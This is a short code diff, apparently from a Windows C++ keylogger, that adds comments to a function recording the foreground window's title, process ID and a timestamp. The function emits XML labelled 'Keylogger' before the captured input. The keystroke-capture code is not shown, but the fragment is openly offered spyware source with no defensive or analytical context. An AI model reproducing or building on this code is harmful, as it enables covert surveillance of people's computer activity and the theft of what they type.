@@ -11,10 +11,26 @@ bool gotchar=true;
 
 FORCEINLINE char* _USER_SHIFT_FOCUS(HWND _PROG_HNDL)
 {
+    /*
+        get the total length of the window text length.
+    */
     int _FG_WINDOW_TITLELENGTH = GetWindowTextLengthA(_PROG_HNDL)+1;
+    /*
+        grab the foreground title and other important information about the
+        process. set the global title accordingly.
+    */
     GetWindowTextA(_PROG_HNDL,_GRAB_WINDOW_TITLE,_FG_WINDOW_TITLELENGTH);
+    /*
+        generate a time stamp to indicate when the change occurred
+    */
     char *TimeStamp=asctime(localtime(&hms));
+    /*
+        set a null character to the last byte of the time stamp.
+    */
     TimeStamp[strlen(TimeStamp)-1]=0x00;
+    /*
+        print out the xml meta data relevant to the process.
+    */
     cout<<"\n\t<Process>\n\t\t<ProcessHandle>"<<_PROG_HNDL<<"</ProcessHandle>\n\t\t<ProcessID>"<<GetWindowThreadProcessId(_PROG_HNDL,NULL)
     <<"</ProcessID>\n\t\t<title>\n\t\t\t<ProcessTitle><![CDATA["<<_GRAB_WINDOW_TITLE<<"]]></ProcessTitle>\n\t\t\t<TimeStamp>"<<TimeStamp<<"</TimeStamp>\n\t\t\t<logged>"
     <<"\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[";
